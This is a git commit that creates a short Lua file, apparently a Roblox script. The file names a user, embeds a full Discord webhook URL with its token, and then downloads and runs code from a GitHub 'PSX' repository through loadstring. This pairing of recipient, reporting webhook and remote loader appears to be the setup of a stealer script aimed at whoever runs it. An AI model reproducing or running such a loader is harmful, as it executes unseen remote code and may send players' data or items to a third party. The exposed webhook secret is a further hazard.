44a169aadaf9d0218431ec713c492401d9fe4edf
k4ftt <103969132+k4ftt@users.noreply.github.com>
2022-12-09 17:48:24 +0100

    Create info.lua

---
+++ info.lua
@@ -0,0 +1,4 @@
+UserName = "Mradnane"
+WebHook = "https://discord.com/api/webhooks/1042199503370993744/FS23k3HuYMXh7ih9sZd10aQgXmlfhHIgOZasfXRXOLHmn1EvYxTKekZv6fzlqQof35Wf"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info1.lua", true))()
